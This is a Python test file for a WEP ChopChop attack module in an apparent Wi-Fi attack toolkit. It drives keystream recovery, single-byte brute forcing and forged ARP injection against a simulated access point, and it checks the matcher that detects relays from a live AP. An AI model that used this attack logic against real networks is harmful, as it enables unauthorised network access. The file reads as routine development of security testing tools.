"""Offline tests for the WEP ChopChop daemon.

The live oracle (does the AP relay?) is hardware-verified by the probe; here we
prove the OFFLINE-testable core — the byte-walk keystream recovery + the RX
oracle matcher + the forge/handoff — by driving the daemon with a SIMULATED
oracle (decrypt the shortened frame with a known key, accept iff the ICV is
valid). If recovery reproduces the true keystream against that oracle, the
attack logic is correct; only the on-air relay-recognition needs the box.
"""
from __future__ import annotations

import asyncio
import zlib
from types import SimpleNamespace

from wifit3.engine.attacks.wep.chopchop import WepChopChop, _hdr_len
from wifit3.engine.attacks.wep.wep_crypto import (
    CRC32_RESIDUE,
    arp_request_plaintext,
    icv,
)

OUR = bytes.fromhex("02aabbccddee")
BSSID = "11:22:33:44:55:66"
KEY = b"abcde"
IV = bytes([0x11, 0x22, 0x33])


def _rc4(key: bytes, n: int) -> bytes:
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) & 0xFF
        s[i], s[j] = s[j], s[i]
    out = bytearray(n)
    i = j = 0
    for k in range(n):
        i = (i + 1) & 0xFF
        j = (j + s[i]) & 0xFF
        s[i], s[j] = s[j], s[i]
        out[k] = s[(s[i] + s[j]) & 0xFF]
    return bytes(out)


def _arp_cipher(sender_ip, target_ip):
    """Build a realistic captured ARP cipher + its true keystream."""
    pt = arp_request_plaintext(sender_mac=OUR, sender_ip=sender_ip,
                               target_ip=target_ip)
    plain = pt + icv(pt)                       # 36 + 4 = 40
    ks = _rc4(IV + KEY, len(plain))
    cipher = bytes(p ^ k for p, k in zip(plain, ks))
    return cipher, ks


def _sim_oracle(iv: bytes, key: bytes):
    """Stand in for the AP: decrypt the shortened cipher; 'relay' iff the ICV
    residue is valid (exactly what the AP's ICV check does)."""
    async def oracle(short: bytes) -> bool:
        kstream = _rc4(iv + key, len(short))
        plain = bytes(c ^ k for c, k in zip(short, kstream))
        return (zlib.crc32(plain) & 0xFFFFFFFF) == CRC32_RESIDUE
    return oracle


def _daemon(oracle=None):
    calls = []
    iface = SimpleNamespace(
        register_rx_callback=lambda c: None,
        unregister_rx_callback=lambda c: None,
    )
    d = WepChopChop(
        iface, SimpleNamespace(bssid=BSSID), SimpleNamespace(),
        source_mac=OUR, on_forged_arp=lambda f: calls.append(f), oracle=oracle,
    )
    d._active = True
    d._cur_iv, d._cur_keyid = IV, 0
    return d, calls


# ---- byte-walk keystream recovery ------------------------------------------

async def test_recover_keystream_reproduces_true_keystream():
    cipher, ks_true = _arp_cipher(bytes([10, 0, 0, 5]), bytes([10, 0, 0, 1]))
    d, _ = _daemon(oracle=_sim_oracle(IV, KEY))
    ks, gap = await d._recover_keystream(cipher)
    assert ks is not None
    assert gap == []                             # no size wall → full walk
    # ks[16..39] recovered by chopping, ks[0..15] from the known ARP prefix.
    assert ks[:40] == ks_true[:40]
    assert d._bytes_done == len(cipher) - 16     # chopped the variable tail


async def test_recover_keystream_dead_seed_has_large_gap():
    cipher, _ = _arp_cipher(bytes([10, 0, 0, 5]), bytes([10, 0, 0, 1]))

    async def never(_short):           # AP that relays nothing
        return False
    d, _ = _daemon(oracle=never)
    ks, gap = await d._recover_keystream(cipher)
    # Stalls on the first byte → gap too big to brute-force → seed is dead.
    assert gap is not None and len(gap) > d._MAX_BRUTE_BYTES


async def test_brute_force_forge_recovers_the_unreachable_byte():
    """Simulate the chopping wall: ks recovered except position 16. The
    brute-force varies that one cipher byte over 256 full-length forged ARPs
    until the AP (oracle) relays the valid one."""
    cipher, ks_true = _arp_cipher(bytes([10, 0, 0, 5]), bytes([10, 0, 0, 1]))
    d, _ = _daemon(oracle=_sim_oracle(IV, KEY))
    ks = bytearray(ks_true)
    ks[16] ^= 0xFF                               # corrupt the "unreachable" byte
    forged = await d._brute_force_forge(bytes(ks), [16])
    assert forged is not None
    body = forged[_hdr_len(forged[0], forged[1]):]
    plain = bytes(c ^ k for c, k in zip(body[4:], _rc4(IV + KEY, len(body) - 4)))
    assert plain[16:22] == OUR                   # sender = our STA
    assert plain[-4:] == icv(plain[:-4])         # valid ICV → AP relays it


async def test_find_accepted_warns_when_multiple_bytes_respond():
    """If >1 byte value relays at a position (uniqueness violated — the user's
    concern), the WEE WOO alarm fires and we still return a responder."""
    from wifit3.engine.attacks.wep.wep_crypto import chop_last_byte_and_fixup
    cipher, _ = _arp_cipher(bytes([10, 0, 0, 5]), bytes([10, 0, 0, 1]))
    g_a, g_b = 0x10, 0xC8
    s_a = chop_last_byte_and_fixup(cipher, g_a)
    s_b = chop_last_byte_and_fixup(cipher, g_b)

    async def two_valid(short: bytes) -> bool:   # both relay + reconfirm
        return short in (s_a, s_b)

    logs = []
    iface = SimpleNamespace(register_rx_callback=lambda c: None,
                            unregister_rx_callback=lambda c: None)
    d = WepChopChop(iface, SimpleNamespace(bssid=BSSID), SimpleNamespace(),
                    source_mac=OUR, on_forged_arp=lambda f: None,
                    log_callback=logs.append, oracle=two_valid)
    d._active = True
    accepted = await d._find_accepted(cipher)
    assert accepted in (g_a, g_b)
    assert any("WEE WOO" in m for m in logs)


async def test_find_accepted_rejects_unconfirmed_spurious_relay():
    """A wrong guess that relays ONCE (misattributed sibling-BSS echo / timing
    slip) must be rejected by the re-confirm step — else it corrupts the walk.
    The true byte (0xd8 for this input) relays consistently and wins."""
    from wifit3.engine.attacks.wep.wep_crypto import chop_last_byte_and_fixup
    cipher, ks_true = _arp_cipher(bytes([10, 0, 0, 5]), bytes([10, 0, 0, 1]))
    true_last = cipher[-1] ^ ks_true[-1]              # 0xd8
    s_true = chop_last_byte_and_fixup(cipher, true_last)
    s_spurious = chop_last_byte_and_fixup(cipher, 0)  # guess 0: wrong, swept 1st
    fired = {"n": 0}

    async def flaky(short: bytes) -> bool:
        if short == s_true:
            return True                              # true byte: always relays
        if short == s_spurious and fired["n"] == 0:
            fired["n"] += 1
            return True                              # wrong byte: one-shot relay
        return False

    d, _ = _daemon(oracle=flaky)
    accepted = await d._find_accepted(cipher)
    assert fired["n"] == 1                            # the spurious WAS offered…
    assert accepted == true_last                      # …but rejected; true won


async def test_recovered_keystream_forges_a_valid_arp():
    """End-to-end offline: recover ks → _succeed forges a broadcast ARP →
    on_forged_arp gets a frame that decrypts to a well-formed ARP from us."""
    cipher, _ = _arp_cipher(bytes([192, 168, 1, 50]), bytes([192, 168, 1, 1]))
    d, calls = _daemon(oracle=_sim_oracle(IV, KEY))
    ks, gap = await d._recover_keystream(cipher)
    assert gap == []
    d._succeed(d._forge_full(ks))
    assert d.is_active is False                  # immediate handoff stopped it
    assert len(calls) == 1
    forged = calls[0]
    body = forged[_hdr_len(forged[0], forged[1]):]
    assert body[:3] == IV                        # reused the target's IV
    plain = bytes(c ^ k for c, k in zip(body[4:], _rc4(IV + KEY, len(body) - 4)))
    snap_arp = bytes([0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06])
    assert plain[:8] == snap_arp                 # valid LLC/SNAP + ARP
    assert plain[16:22] == OUR                   # sender = our STA
    assert plain[-4:] == icv(plain[:-4])         # valid ICV → AP will relay


# ---- stop() halts an in-flight walk (campaign Stop IVs tears chop down) ----

async def test_stop_halts_an_in_flight_byte_walk():
    """Regression: clicking Stop IVs calls campaign.stop() → chop.stop(); the
    long byte-walk must actually end (not orphan after the buttons hide)."""
    captured = (bytes([0x08, 0x42, 0, 0]) + b"\xff" * 6
                + bytes.fromhex("aa:bb:cc:dd:ee:06") + OUR + b"\x00\x00"
                + IV + b"\x00" + bytes(40))               # 68B broadcast WEP

    async def slow(_short):           # never relays → keeps the walk sweeping
        await asyncio.sleep(0.003)
        return False

    iface = SimpleNamespace(register_rx_callback=lambda c: None,
                            unregister_rx_callback=lambda c: None)
    d = WepChopChop(iface, SimpleNamespace(bssid=BSSID),
                    SimpleNamespace(arp_candidates=lambda b: [captured]),
                    source_mac=OUR, on_forged_arp=lambda f: None, oracle=slow)
    d.start()
    await asyncio.sleep(0.02)         # let the walk get in-flight
    assert d.is_active
    task = d._task
    d.stop()
    await asyncio.sleep(0.05)         # let the cancellation deliver
    assert not d.is_active
    assert task.done()               # the loop actually ended (no orphan)


# ---- the live-AP oracle matcher (RX callback) ------------------------------

def _relay_frame(sa=OUR, fc1=0x42, da=b"\xff" * 6, fc0=0x08, pad=40):
    return (bytes([fc0, fc1]) + b"\x00\x00" + da + bytes.fromhex("aa:bb:cc:dd:ee:06")
            + sa + b"\x00\x00" + b"\xab\xcd\xef\x00" + b"\x00" * pad)


def test_rx_oracle_fires_on_pinned_relay():
    d, _ = _daemon()
    relay = _relay_frame()
    d._expected_relay_len = len(relay)
    d._rx_cb(relay, -40, 0.0)
    assert d._relay_seen


def test_rx_oracle_ignores_non_matching():
    d, _ = _daemon()
    d._expected_relay_len = len(_relay_frame())
    d._rx_cb(_relay_frame(sa=bytes.fromhex("020000000099")), -40, 0.0)  # not us
    assert not d._relay_seen
    d._rx_cb(_relay_frame(fc1=0x41), -40, 0.0)        # ToDS (our own inject)
    assert not d._relay_seen
    d._rx_cb(_relay_frame(da=OUR), -40, 0.0)          # unicast DA
    assert not d._relay_seen
    d._rx_cb(_relay_frame(fc0=0x80), -40, 0.0)        # mgmt, not data
    assert not d._relay_seen


def test_rx_oracle_rejects_stale_echo_of_wrong_length():
    """The sibling-BSS echo of the PREVIOUS byte is 1 longer than this guess's
    expected relay — it must NOT be accepted (that bug stalled the walk)."""
    d, _ = _daemon()
    d._expected_relay_len = len(_relay_frame())        # this byte's expectation
    d._rx_cb(_relay_frame(pad=41), -40, 0.0)           # previous byte's relay (+1B)
    assert not d._relay_seen
